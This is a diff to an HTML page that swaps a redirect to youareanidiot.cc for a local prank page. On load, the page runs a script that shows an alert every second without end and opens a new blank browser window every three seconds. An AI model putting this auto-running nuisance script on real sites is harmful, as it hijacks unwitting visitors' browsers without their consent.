@@ -1,14 +1,28 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-    <title>Redirecting...</title>
-    <meta http-equiv="refresh" content="0; url='https://www.youareanidiot.cc'">
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>You Are An Idiot</title>
+    <script>
+        function startChaos() {
+            // Display alerts in a loop (using setTimeout to avoid complete freeze)
+            (function showAlert() {
+                alert("You Are An Idiot! 😀");
+                setTimeout(showAlert, 1000);
+            })();
+
+            // Open new browser windows or tabs periodically
+            setInterval(() => {
+                window.open("", "_blank");
+            }, 3000);
+        }
+
+        window.onload = startChaos;
+    </script>
 </head>
 <body>
-    <!-- Dalton Metzler says hi -->
-    <h1>Redirecting...</h1>
-    <script>
-        window.location.href = "https://www.youareanidiot.cc";
-    </script>
+    <h1>You Are An Idiot!</h1>
+    <p>This is just a fun page example inspired by youareanidiot.cc. Enjoy the chaos!</p>
 </body>
 </html>
